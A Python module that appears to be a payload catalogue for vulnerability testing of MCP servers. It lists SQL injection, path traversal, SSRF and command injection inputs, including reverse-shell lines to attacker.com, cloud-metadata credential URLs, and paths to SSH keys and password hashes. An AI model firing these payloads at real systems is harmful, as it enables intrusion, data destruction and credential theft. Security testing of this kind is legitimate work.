"""
Comprehensive attack payload database for MCP vulnerability testing.
Contains various payloads for different types of security vulnerabilities.
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection
    "test');--",
    "test'--",
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' #",
    "' OR '' = '",
    # Union-based injection
    "' UNION SELECT 1, 'pwned', 'pwned', 'pwned', 'pwned'--",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
    "' UNION SELECT name, address, email, phone, credit_card FROM records--",
    # Time-based blind injection
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    # Boolean-based blind injection
    "' OR 1=1 AND '1'='1",
    "' OR 1=1 AND '1'='2",
    "' OR (SELECT COUNT(*) FROM records) > 0--",
    # Error-based injection
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    # Stacked queries
    "test', 'malicious');--",
    "; DROP TABLE records; --",
    "Robert'); DROP TABLE records;--",
    "'; INSERT INTO records (name, address) VALUES ('hacked', 'hacked');--",
    # Advanced techniques
    "' OR 1=1 LIMIT 1 OFFSET 0--",
    "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 GROUP BY 1--",
    "' OR 1=1 HAVING 1=1--",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    # Unix/Linux paths
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../../etc/hosts",
    "/proc/version",
    "/proc/self/environ",
    "/proc/1/cmdline",
    "/etc/hosts",
    "/etc/issue",
    "/etc/motd",
    "/etc/fstab",
    "/etc/crontab",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/home/user/.ssh/id_rsa",
    "/root/.ssh/id_rsa",
    # Windows paths
    "..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\Windows\\repair\\sam",
    "C:\\Windows\\repair\\system",
    "C:\\Windows\\System32\\config\\system",
    "C:\\Windows\\System32\\config\\software",
    "C:\\Windows\\System32\\config\\security",
    "C:\\Windows\\System32\\config\\default",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\config\\SECURITY",
    "C:\\Windows\\System32\\config\\SOFTWARE",
    "C:\\Windows\\System32\\config\\SYSTEM",
    # Encoded variations
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "whoami",
    "id",
    "uname -a",
    "ls -la",
    "dir",
    "echo 'command injection test'",
    # System information
    "cat /etc/passwd",
    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "cat /proc/version",
    "systeminfo",
    "wmic os get caption,version",
    "hostname",
    "whoami /all",
    # Network commands
    "ping -c 1 127.0.0.1",
    "nslookup google.com",
    "netstat -an",
    "ipconfig /all",
    "ifconfig -a",
    "arp -a",
    # Process commands
    "ps aux",
    "tasklist",
    "wmic process list",
    "net user",
    "net localgroup",
    # File system commands
    "find / -name '*.txt' 2>/dev/null | head -10",
    "dir /s /b C:\\ | findstr .txt",
    "ls -la /home",
    "dir C:\\Users",
    # Advanced injection techniques
    "ls; cat /etc/passwd",
    "dir & type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "whoami && id",
    "uname -a; ps aux",
    "echo 'test' | nc -e /bin/sh attacker.com 4444",
    "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f",
]

# SSRF (Server-Side Request Forgery) Payloads
SSRF_PAYLOADS = [
    # Localhost attacks
    "http://localhost:22",
    "http://127.0.0.1:22",
    "http://0.0.0.0:22",
    "http://[::1]:22",
    "http://localhost:80",
    "http://localhost:443",
    "http://localhost:8080",
    "http://localhost:3000",
    "http://localhost:9000",
    # Cloud metadata endpoints
    "http://169.254.169.254/metadata",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/metadata/instance",
    "http://169.254.169.254/metadata/identity/credentials/ec2/security-credentials/",
    # Internal network scanning
    "http://internal.service:8080",
    "http://internal-api:3000",
    "http://database:5432",
    "http://redis:6379",
    "http://elasticsearch:9200",
    "http://mongodb:27017",
    "http://mysql:3306",
    "http://postgres:5432",
    # File protocol attacks
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/version",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "file:///C:/Windows/win.ini",
    # Gopher protocol
    "gopher://127.0.0.1:25",
    "gopher://127.0.0.1:21",
    "gopher://127.0.0.1:110",
    "gopher://127.0.0.1:143",
    # Other protocols
    "ftp://127.0.0.1:21",
    "ldap://127.0.0.1:389",
    "dict://127.0.0.1:11211",
    "sftp://127.0.0.1:22",
    # IPv6 addresses
    "http://[::1]:22",
    "http://[::1]:80",
    "http://[::1]:443",
    # DNS rebinding
    "http://attacker.com:80",
    "http://evil.com:443",
    "http://malicious.org:8080",
    # Port scanning
    "http://127.0.0.1:1",
    "http://127.0.0.1:2",
    "http://127.0.0.1:3",
    "http://127.0.0.1:21",
    "http://127.0.0.1:22",
    "http://127.0.0.1:23",
    "http://127.0.0.1:25",
    "http://127.0.0.1:53",
    "http://127.0.0.1:80",
    "http://127.0.0.1:110",
    "http://127.0.0.1:143",
    "http://127.0.0.1:443",
    "http://127.0.0.1:993",
    "http://127.0.0.1:995",
    "http://127.0.0.1:3389",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
]

# Environment Variable Names
ENVIRONMENT_VARIABLES = [
    # Common sensitive variables
    "SECRET_KEY",
    "API_KEY",
    "PRIVATE_KEY",
    "DATABASE_URL",
    "DB_PASSWORD",
    "PASSWORD",
    "PASS",
    "PWD",
    "TOKEN",
    "ACCESS_TOKEN",
    "REFRESH_TOKEN",
    "SESSION_SECRET",
    "JWT_SECRET",
    "ENCRYPTION_KEY",
    "AES_KEY",
    "RSA_KEY",
    "SSL_KEY",
    "TLS_KEY",
    # Cloud provider keys
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AZURE_CLIENT_ID",
    "AZURE_CLIENT_SECRET",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "GOOGLE_CLOUD_KEYFILE_JSON",
    # Database credentials
    "MYSQL_ROOT_PASSWORD",
    "POSTGRES_PASSWORD",
    "MONGODB_PASSWORD",
    "REDIS_PASSWORD",
    "DB_PASSWORD",
    "DATABASE_PASSWORD",
    # System variables
    "PATH",
    "USER",
    "USERNAME",
    "HOME",
    "TEMP",
    "TMP",
    "COMSPEC",
    "SHELL",
    "PYTHONPATH",
    "JAVA_HOME",
    "NODE_PATH",
    # Windows specific
    "APPDATA",
    "LOCALAPPDATA",
    "PROGRAMFILES",
    "PROGRAMFILES(X86)",
    "SYSTEMROOT",
    "WINDIR",
    "NUMBER_OF_PROCESSORS",
    "PROCESSOR_IDENTIFIER",
    "PROCESSOR_ARCHITECTURE",
    "OS",
    "COMPUTERNAME",
    "USERDOMAIN",
    "USERPROFILE",
    # Development variables
    "NODE_ENV",
    "FLASK_ENV",
    "DJANGO_SETTINGS_MODULE",
    "RAILS_ENV",
    "RACK_ENV",
    "ENVIRONMENT",
    "DEBUG",
    "LOG_LEVEL",
]

# Weak Cryptographic Algorithms
WEAK_CRYPTO_ALGORITHMS = [
    "md5",
    "sha1",
    "sha224",
    "md4",
    "md2",
    "crc32",
    "adler32",
]

# Common File Extensions for Information Disclosure
SENSITIVE_FILE_EXTENSIONS = [
    ".bak",
    ".backup",
    ".old",
    ".orig",
    ".tmp",
    ".temp",
    ".log",
    ".conf",
    ".config",
    ".cfg",
    ".ini",
    ".env",
    ".key",
    ".pem",
    ".p12",
    ".pfx",
    ".jks",
    ".keystore",
    ".truststore",
    ".sql",
    ".dump",
    ".db",
    ".sqlite",
    ".sqlite3",
    ".rdb",
    ".aof",
    ".xml",
    ".json",
    ".yaml",
    ".yml",
    ".properties",
    ".txt",
    ".md",
    ".readme",
    ".git",
    ".svn",
    ".hg",
    ".bzr",
]

# Common Sensitive Files
SENSITIVE_FILES = [
    # Unix/Linux
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/issue",
    "/etc/motd",
    "/etc/fstab",
    "/etc/crontab",
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config",
    "/etc/ssl/openssl.cnf",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/etc/httpd/httpd.conf",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/secure",
    "/var/log/messages",
    "/proc/version",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/self/environ",
    "/proc/1/cmdline",
    "/home/user/.ssh/id_rsa",
    "/home/user/.ssh/id_rsa.pub",
    "/home/user/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_rsa.pub",
    "/root/.ssh/authorized_keys",
    "/home/user/.bash_history",
    "/root/.bash_history",
    "/home/user/.mysql_history",
    "/root/.mysql_history",
    "/home/user/.psql_history",
    "/root/.psql_history",
    # Windows
    "C:\\Windows\\System32\\config\\sam",
    "C:\\Windows\\System32\\config\\system",
    "C:\\Windows\\System32\\config\\software",
    "C:\\Windows\\System32\\config\\security",
    "C:\\Windows\\System32\\config\\default",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\Windows\\repair\\sam",
    "C:\\Windows\\repair\\system",
    "C:\\Windows\\repair\\software",
    "C:\\Windows\\repair\\security",
    "C:\\Windows\\repair\\default",
    "C:\\boot.ini",
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
    "C:\\Windows\\System32\\sysprep\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\sysprep.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend\\sysprep.xml",
    "C:\\Windows\\Panther\\unattend.xml",
    "C:\\Windows\\Panther\\sysprep.xml",
    "C:\\Windows\\Panther\\unattend\\unattend.xml",
    "C:\\Windows\\Panther\\unattend\\sysprep.xml",
    "C:\\Windows\\System32\\sysprep\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\sysprep.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend\\unattend.xml",
    "C:\\Windows\\System32\\sysprep\\Panther\\unattend\\sysprep.xml",
    "C:\\Windows\\Panther\\unattend.xml",
    "C:\\Windows\\Panther\\sysprep.xml",
    "C:\\Windows\\Panther\\unattend\\unattend.xml",
    "C:\\Windows\\Panther\\unattend\\sysprep.xml",
]

# Attack payload collections organized by category
ATTACK_PAYLOADS = {
    "sql_injection": SQL_INJECTION_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "command_injection": COMMAND_INJECTION_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "environment_vars": ENVIRONMENT_VARIABLES,
    "weak_crypto": WEAK_CRYPTO_ALGORITHMS,
    "sensitive_files": SENSITIVE_FILES,
    "file_extensions": SENSITIVE_FILE_EXTENSIONS,
}


def get_payloads_by_category(category: str) -> list:
    """Get payloads for a specific attack category."""
    return ATTACK_PAYLOADS.get(category, [])


def get_all_payloads() -> dict:
    """Get all attack payloads organized by category."""
    return ATTACK_PAYLOADS


def get_random_payloads(category: str, count: int = 5) -> list:
    """Get random payloads from a specific category."""
    import random

    payloads = get_payloads_by_category(category)
    if not payloads:
        return []
    return random.sample(payloads, min(count, len(payloads)))


if __name__ == "__main__":
    # Display available categories
    print("Available attack payload categories:")
    for category in ATTACK_PAYLOADS.keys():
        print(f"  - {category}: {len(ATTACK_PAYLOADS[category])} payloads")

    # Show some example payloads
    print("\nExample SQL injection payloads:")
    for payload in SQL_INJECTION_PAYLOADS[:5]:
        print(f"  - {payload}")

    print("\nExample path traversal payloads:")
    for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
        print(f"  - {payload}")
